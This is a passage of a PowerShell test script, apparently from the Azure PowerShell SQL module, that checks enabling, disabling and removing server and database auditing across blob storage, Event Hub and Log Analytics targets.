		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "statement <> 'select 1'" $policy.PredicateExpression

		
		Set-AzSqlServerAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "statement <> 'select 1'" $policy.PredicateExpression

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 -PredicateExpression ""
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "" $policy.PredicateExpression

		
		Set-AzSqlServerAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-ExtendedAuditOnDatabase
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "" $policy.PredicateExpression

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 -PredicateExpression "statement <> 'select 1'"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "statement <> 'select 1'" $policy.PredicateExpression

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "statement <> 'select 1'" $policy.PredicateExpression

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 -PredicateExpression ""
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "" $policy.PredicateExpression

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-AuditOnDatabase
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/" + $params.databaseName

	try
	{
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		$policy = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseAudit
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-Null $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlDatabaseAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlDatabaseAudit -LogAnalyticsTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-RemoveAuditOnDatabase
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/" + $params.databaseName

	try
	{
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		$policy = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseAudit
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-Null $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlDatabaseAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-AuditOnServer
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/master"

	try
	{
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		$policy = Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Get-AzSqlServerAudit
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Set-AzSqlServerAudit -BlobStorageTargetState Enabled -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
